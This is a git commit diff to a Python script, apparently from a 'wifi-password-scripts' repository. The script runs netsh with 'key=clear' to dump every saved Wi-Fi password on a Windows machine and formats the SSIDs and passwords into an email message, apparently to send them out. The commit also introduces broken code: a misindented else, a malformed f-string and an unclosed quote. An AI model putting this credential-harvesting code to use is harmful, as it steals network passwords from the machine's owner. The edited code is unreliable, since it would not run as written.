ecda69c2645c6c86ab63fb60705d38151ce35da5
telugukalituts <70319225+telugukalituts@users.noreply.github.com>
2021-01-16 05:49:52 -0800

    Update windows10-wifi-email.py

--- wifi-password-scripts-main/windows10-wifi-email.py
+++ wifi-password-scripts-main/windows10-wifi-email.py
@@ -24,23 +24,23 @@ if len(profile_names) != 0:
     for name in profile_names:
         # Every wifi connection will need its own dictionary which will be appended to the wifi_list
         wifi_profile = dict()
-        # We now run a more specific command to see the information about the specific wifi connection and if the Security key is not absent we can possibly get the password.
+        # We now run a more specific command to see the information about the specific wifi connection and if the Security key is not absent we can possibly get the password
         profile_info = subprocess.run(["netsh", "wlan", "show", "profile", name], capture_output = True).stdout.decode()
         # We use a regular expression to only look for the absent cases so we can ignore them.
         if re.search("Security key           : Absent", profile_info):
             continue
-        else:
+            else:
             # Assign the ssid of the wifi profile to the dictionary
-            wifi_profile["ssid"] = name
+                wifi_profile["ssid"] = name
             # These cases aren't absent and we should run them "key=clear" command part to get the password
-            profile_info_pass = subprocess.run(["netsh", "wlan", "show", "profile", name, "key=clear"], capture_output = True).stdout.decode()
+                profile_info_pass = subprocess.run(["netsh", "wlan", "show", "profile", name, "key=clear"], capture_output = True).stdout.decode()
             # Again run the regular expressions to capture the group after the : which is the password
-            password = re.search("Key Content            : (.*)\r", profile_info_pass)
-            # Check if we found a password in the regular expression. All wifi connections will not have passwords.
+                password = re.search("Key Content            : (.*)\r", profile_info_pass)
+            # Check if we found a password in the regular expression. All wifi connections will not have passwords
             if password == None:
                 wifi_profile["password"] = None
             else:
-                # We assign the grouping (Where the password is contained) we are interested to the password key in the dictionary.
+                # We assign the grouping (Where the password is contained) we are interested to the password key in the dictionary
                 wifi_profile["password"] = password[1]
             # We append the wifi information to the wifi_list
             wifi_list.append(wifi_profile)
@@ -48,7 +48,7 @@ if len(profile_names) != 0:
 # Create the message for the email
 email_message = ""
 for item in wifi_list:
-    email_message += f"SSID: {item['ssid']}, Password: {item['password']}\n"
+    email_message += f "SSID: {item['ssid']}, Password: {item['password]}\n"
 
 # Create EmailMessage Object
 email = EmailMessage()
